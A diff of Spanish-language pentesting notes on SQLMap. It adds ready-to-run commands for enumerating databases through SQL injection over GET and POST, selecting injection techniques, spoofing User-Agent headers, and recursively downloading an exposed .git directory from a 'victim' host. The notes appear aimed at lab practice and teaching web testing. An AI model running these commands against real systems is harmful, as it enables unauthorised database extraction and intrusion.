@@ -1,6 +1,6 @@
 # SQL-Map 
 
-Tags: #Tool #Web #Enumeracion #BurpSuite #SQLI #Git
+Tags: #Tool #Web #Enumeracion #BurpSuite #SQLI #Git #SQLMap 
 
 **SQLMap** es una herramienta de pruebas de penetración de código abierto que se utiliza para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Esta herramienta se basa en un motor de inyección SQL altamente automatizado que puede detectar y explotar una amplia variedad de vulnerabilidades de inyección SQL en diferentes sistemas de gestión de bases de datos.
 
@@ -10,13 +10,135 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 
 ## SQLMap
 
+```bash 
+❯ sqlmap --update     # Actualizar la herramienta 
+❯ sqlmap --version    # Miramos la version 
+❯ sqlmap -h           # Miramos la ayuda 
+❯ sqlmap -hh          # Todas las opciones de ayuda 
+```
+
+## Comandos básicos y método GET
+
+```bash 
+# La URL es donde se encuentra la inyeccion SQL
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs 
+
+	# u = Parametro URL
+	# dbs = Extraer la base de datos existentes 
+
+# Si nos pregunta 'Basic UNION Tests' podemos darle 'YES'
+# Si nos pregunta 'Specific for other DBMSes' es recomendable 'NO' ya que no queremos probar con mas DBs 
+# Si pregunta 'Include all tests for Postgre or MySQL' podemos darle 'YES'
+# Si encuentra un parametro vulnerable y nos pregunta si queremos testear otros parametros podremos darle 'NO'
+```
+
+```bash 
+❯ ls -la # En Linux podemos ver la carpeta oculta de SQLMap llamada '.sqlmap' la cual contiene el 'historial' y 'output'
+```
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --dbms MySQL -p username --purge 
+
+	# u = Parametro URL
+	# dbs = Extraer la base de datos existentes
+	# p = Especificar el parametro que es explotable 
+	# dbms = Especifica el gestor de DB a utilizar 
+	# purge = Borrara la carpeta donde se almacena el dominio utilizado en el 'output'
+```
+
+```bash 
+❯ sqlmap --wizard    # Provee varios menus de acompañamiento durante la ejecucion del ataque
+```
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --random-agent --purge    
+
+	# random-agente = Genera un 'User Agent' diferente al momento de hacer el ataque
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --user-agent="Opera/9.20 (Windows NT 5.1; U; it)" --purge
+
+	# user-agent = Agregas la cabecera del 'User-Agent' personalizada
+```
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&user-php-submit-button=View" --dbs --purge --mobile 
+
+	# mobile = Escoger una cabecera 'User-Agent' de una app movil como: 'Apple, Google Nexus, Huawei, etc...'
+```
+
+## Tipos de inyecciones y método GET
+
+```bash 
+# Error Based 
+# Enviar una consulta a la DB y nos mostrara los errores de la app
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --technique E -p password
+
+	# technique = Especificamos la tecnica a utlizar 
+		# B = Boolean Based Blind
+		# E = Error Based
+		# U = Union 
+		# T = Time Based Blind 
+	# p = Especificamos el parametro a utilizar
+```
+
+```bash 
+# Union 
+# Enviar una consulta a la DB uniendo los resultados de instrucciones SELECT en una sola peticion
+
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --technique U -p password
+
+	# technique = Especificamos la tecnica a utlizar 
+		# B = Boolean Based Blind
+		# E = Error Based
+		# U = Union 
+		# T = Time Based Blind 
+	# p = Especificamos el parametro a utilizar
+```
+
+## Tipos de inyecciones y método POST
+
+```bash 
+# Boolean Based Blind 
+# Enviar una consulta a la DB para que nos devuelva un resultado 'True or False'
+
+❯ sqlmap -u "http://IP/index.php?page=login.php" --dbs --dbms MySQL --random-agent --data="username=omar&password=omar&login-php-submit-button=Login" --method POST --technique B -p username
+
+	# data = Agregamos el cuerpo de la peticion POST que contiene datos como: 'username, password', estos datos los podemos obtener desde 'Burpsuite'
+	# method = Especificacion del metodo a utilizar
+	# technique = Especificamos la tecnica a utlizar 
+		# B = Boolean Based Blind
+		# E = Error Based
+		# U = Union 
+		# T = Time Based Blind 
+	# p = Especificamos el parametro a utilizar
+```
+
+```bash 
+# Boolean Based Blind 
+# Enviar una consulta a la DB, el tiempo de espera ayuda a determinar si el resultado es 'True or False'
+
+❯ sqlmap -u "http://IP/index.php?page=login.php" --dbs --dbms MySQL --random-agent --data="username=omar&password=omar&login-php-submit-button=Login" --method POST --technique T -p username --time-sec 10
+
+	# data = Agregamos el cuerpo de la peticion POST que contiene datos como: 'username, password', estos datos los podemos obtener desde 'Burpsuite'
+	# method = Especificacion del metodo a utilizar
+	# technique = Especificamos la tecnica a utlizar 
+		# B = Boolean Based Blind
+		# E = Error Based
+		# U = Union 
+		# T = Time Based Blind 
+	# p = Especificamos el parametro a utilizar
+	# time-sec = Le damos un tiempo maximo de espera a la apliacion ya que estaremos usando la tecnica 'Time Based Blind' y asi SQLMap no crea que la app dejo de funcionar 
+```
+
 ## Primer Forma 
 
 ```bash 
-❯ sqlmap -u 'http://site.com/index.php?id=1'    #Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 
+❯ sqlmap -u 'http://site.com/index.php?id=1'    # Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 
 ```
 
-Cuando mires en una maquina victima el directorio **/.git/** quiere decir que es porque se ha clonado un directorio Git y eso puede suponer un riesgo porque si tiene capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
+Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se ha clonado un directorio Git y puede suponer un riesgo, porque si tiene la capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
 
 ```bash 
 ❯ wget -r http://192.168.68.11           # Nos descargarnos de forma recursiva el contenido del dir .git
